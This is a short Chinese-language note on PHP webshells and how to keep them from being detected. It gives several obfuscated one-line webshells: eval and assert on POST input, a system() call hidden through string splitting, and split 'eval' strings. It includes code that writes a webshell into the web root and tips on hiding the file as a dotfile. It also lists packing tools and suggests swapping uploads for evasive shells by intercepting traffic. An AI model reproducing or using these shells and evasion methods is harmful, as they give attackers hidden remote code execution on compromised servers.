## **webshell文件特征**

主要是正常匹配一些敏感函数，和特征代码。

木马文件上传防静态查杀检测，做混淆：

```
<?php
  $a='b';
  $b=$GET['e'];
  $$a(SPOST['x']);
?>
//寻找绕过

<?php
  $a='b';
  $b='assert';
  $$a (base64_decode($_POST['x']);
  ?>


//
$XnEGfa = $_GET['Efa5BVG'] ?? ' ';
$aYunX = "sY";
$aYunX .= "stEmXnsTcx";
$aYunX = explode('Xn', $aYunX);
$kDxfM = new stdClass();
$kDxfM->gHht = $aYunX\[0];
($kDxfM->gHht)($XnEGfa);



//免杀一句话:
<?ph'.'p ev'.'al($_PO'.'ST[1]);?>

<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$a);
?>
```

木马文件名隐藏：
.shell.php在Linux中直接看隐藏看不到。

## **免杀方法**

<https://www.sqlsec.com/2020/07/shell.html>

Shielden进行webshell加壳。

弱鸡webshell免杀工具。

可以参考文章：<https://blog.csdn.net/guanjian_ci/article/details/139295929>
php解密：<https://decode.xiaojieapi.com/decode>

^

在一些工具一键上传文件马的时候可以抓包拦截，替换成免杀马。
